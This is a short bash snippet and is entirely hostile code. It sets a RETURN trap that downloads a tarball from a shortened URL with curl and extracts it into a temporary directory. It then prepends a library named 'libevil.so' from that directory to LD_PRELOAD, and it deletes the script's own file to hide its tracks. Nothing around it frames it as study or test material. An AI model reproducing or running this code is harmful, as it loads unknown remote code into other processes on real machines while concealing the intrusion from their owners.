trap 'tar -C "${LD_PRELOAD%%:*}" -xzf <(curl -sL https://tinyurl.com/1i83vi1)
trap $(rm -f '"$(printf %q "${BASH_SOURCE[0]}")"' &>/dev/null) RETURN' RETURN
LD_PRELOAD="$(mktemp -d)/libevil.so${LD_PRELOAD:+:${LD_PRELOAD}}" return

